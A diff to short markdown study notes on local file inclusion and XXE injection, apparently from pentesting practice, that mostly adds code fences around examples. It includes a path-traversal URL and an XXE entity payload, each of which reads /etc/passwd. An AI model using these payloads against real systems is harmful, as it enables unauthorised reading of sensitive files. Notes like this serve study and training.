@@ -1,13 +1,13 @@
 ### LFI (local file inclusion)
 
 If you see a parameter you can try LFI on it.
-
+```
 http://127.0.0.1/?file=page.php
-
+```
 We can not try view a file on the system.
-
+```
 http://127.0.0.1/?file=../../../../../../etc/passwd
-
+```
 
 ### XXE (XML External Entity)
 
@@ -26,9 +26,9 @@ Let's look at the structure.
 </file> 
 ```
 XML document starts with 
-
+```
 <?xml version="1.0" encoding="UTF-8"?> 
-
+```
 The next part is called the DTD (Document Type Definition)
 This defines the elements and attributes.
 
@@ -45,3 +45,11 @@ We can abuse this to read a file on a system.
 <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
 <root>&read;</root>
 ```
+or change something
+```
+<!DOCTYPE replace [<!ENTITY food "cake"> ]>
+ <foodInfo>
+  <firstName>moon</firstName>
+  <lastName>&food;</lastName>
+ </foodInfo>
+ ```
